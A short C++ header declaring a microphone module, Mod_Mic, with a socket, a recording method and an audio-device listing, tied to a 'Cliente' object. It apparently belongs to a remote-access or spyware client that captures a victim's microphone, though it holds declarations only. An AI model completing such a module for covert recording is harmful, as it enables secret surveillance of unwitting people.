#ifndef ___MIC
#define ___MIC

#include "headers.hpp"
#include "cliente.hpp"
#include <mmsystem.h>

class Mod_Mic{
public:
	SOCKET sckSocket = INVALID_SOCKET;
	void Grabar_pacman();
	std::vector<std::string> ObtenerDispositivos();

	Mod_Mic(Cliente* pCliente) : ptr_copy(pCliente) {}
private:
	Cliente* ptr_copy = nullptr;
};

#endif